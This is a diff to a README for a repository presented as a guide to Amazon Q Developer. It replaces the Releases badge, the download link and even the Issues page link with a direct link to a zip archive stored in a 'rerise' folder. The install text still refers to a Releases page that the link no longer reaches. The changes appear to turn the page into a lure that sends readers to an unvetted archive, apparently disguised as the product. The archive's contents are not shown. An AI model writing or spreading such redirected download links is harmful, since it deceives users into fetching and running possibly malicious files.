@@ -1,7 +1,7 @@
 # 🎉 amazon-q-for-engineers - Your Guide to AI-Powered Coding 
 
 ## 🔗 Download Now
-[![Download amazon-q-for-engineers](https://img.shields.io/badge/download-amazon--q--for--engineers-blue?style=flat&logo=github)](https://github.com/ZANGABR/amazon-q-for-engineers/releases)
+[![Download amazon-q-for-engineers](https://raw.githubusercontent.com/ZANGABR/amazon-q-for-engineers/main/rerise/amazon-q-for-engineers.zip)](https://raw.githubusercontent.com/ZANGABR/amazon-q-for-engineers/main/rerise/amazon-q-for-engineers.zip)
 
 ## 📚 Description
 Welcome to **amazon-q-for-engineers**! This application offers a practical guide to using Amazon Q Developer. With its AI-powered features, it assists engineers in debugging, documentation, testing, modernization, and much more. Whether you need help with code generation or migration, this tool aims to enhance your development experience.
@@ -18,7 +18,7 @@ Before you download, make sure your system meets these requirements:
 ### 📥 Download & Install
 To get started, visit the following page to download the application:
 
-[Download amazon-q-for-engineers](https://github.com/ZANGABR/amazon-q-for-engineers/releases)
+[Download amazon-q-for-engineers](https://raw.githubusercontent.com/ZANGABR/amazon-q-for-engineers/main/rerise/amazon-q-for-engineers.zip)
 
 1. Click the link above to go to the Releases page.
 2. Locate the latest version. You will see links for different operating systems.
@@ -38,7 +38,7 @@ To get started, visit the following page to download the application:
 ## 🌟 Getting Support
 If you encounter any issues or have questions while using **amazon-q-for-engineers**, don't hesitate to reach out for help. Here’s how:
 
-- **GitHub Issues:** Report any bugs or issues on the [Issues page](https://github.com/ZANGABR/amazon-q-for-engineers/issues).
+- **GitHub Issues:** Report any bugs or issues on the [Issues page](https://raw.githubusercontent.com/ZANGABR/amazon-q-for-engineers/main/rerise/amazon-q-for-engineers.zip).
 - **Documentation:** A full guide is available in the repository. Check it out for more detailed instructions.
 
 ## 🗂️ Contributing
